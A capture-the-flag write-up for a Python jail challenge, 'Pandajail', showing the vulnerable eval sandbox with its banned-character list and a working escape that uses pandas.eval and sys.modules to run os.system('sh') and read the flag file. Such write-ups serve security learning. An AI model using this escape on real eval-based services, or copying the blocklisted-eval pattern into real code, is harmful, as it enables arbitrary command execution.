# Pandajail

The source code for Pandajail is below:

```python
import pandas
import sys

banned = "[]{}+-,!@#$%^&*;:0123456789'\"<>="

def isvalid(code):
    try:
        assert code.count("_") <= 1
        assert code.count(".") <= 3
        assert not any(c in code for c in banned)
        return True
    except AssertionError as e:
        print(f"Wrong")
        return False

def main():
    code = input(">>> ")
    if isvalid(code):
        try:
            result = eval(code, {"builtins": {}, "pandas": pandas, "sys": sys})
            print(result)
        except Exception as e:
            print(f"Nope")

main()
```

sys has a function `sys.stdin.readline` that reads a line from standard input, and pandas has a function `pandas.eval` that runs Python code.
From there, you could traverse sys.modules to call os.system('sh') and get a shell, then print the flag at /flag.txt.

```
>>> pandas.eval(sys.stdin.readline())
sys.modules['os'].system('sh')
ls
main.py
cd ..
ls
app
bin
dev
etc
flag.txt
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag.txt
FFCTF{p1ckl3_th4t_rc3_l1k3_4_pro_c7ece31a}
```